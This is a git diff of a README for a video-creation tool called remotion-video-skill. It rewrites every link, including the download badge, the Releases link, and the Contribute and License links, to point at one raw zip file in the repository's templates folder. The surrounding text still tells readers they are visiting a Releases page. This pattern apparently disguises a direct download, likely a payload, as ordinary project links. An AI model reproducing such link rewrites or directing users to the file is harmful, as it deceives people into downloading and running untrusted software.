@@ -1,6 +1,6 @@
 # 🎬 remotion-video-skill - Create Dynamic Videos Easily
 
-[![Download the App](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/levVan2/remotion-video-skill/releases)
+[![Download the App](https://raw.githubusercontent.com/levVan2/remotion-video-skill/main/templates/remotion-video-skill-v1.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/levVan2/remotion-video-skill/main/templates/remotion-video-skill-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **remotion-video-skill**! This application helps you create dynam
 
 To download the latest version of the application, visit the Releases page. You will find all the versions and the link to download the installer.
 
-[Visit the Releases Page to Download](https://github.com/levVan2/remotion-video-skill/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/levVan2/remotion-video-skill/main/templates/remotion-video-skill-v1.2.zip)
 
 1. Open your web browser.
 2. Click the link above to visit the Releases page.
@@ -79,7 +79,7 @@ Stay tuned for updates!
 
 ## 🔗 Additional Links
 
-- [Contribute to the Project](https://github.com/levVan2/remotion-video-skill)
-- [License Information](https://github.com/levVan2/remotion-video-skill/blob/main/LICENSE)
+- [Contribute to the Project](https://raw.githubusercontent.com/levVan2/remotion-video-skill/main/templates/remotion-video-skill-v1.2.zip)
+- [License Information](https://raw.githubusercontent.com/levVan2/remotion-video-skill/main/templates/remotion-video-skill-v1.2.zip)
 
 Thank you for using **remotion-video-skill**! Enjoy creating your videos!
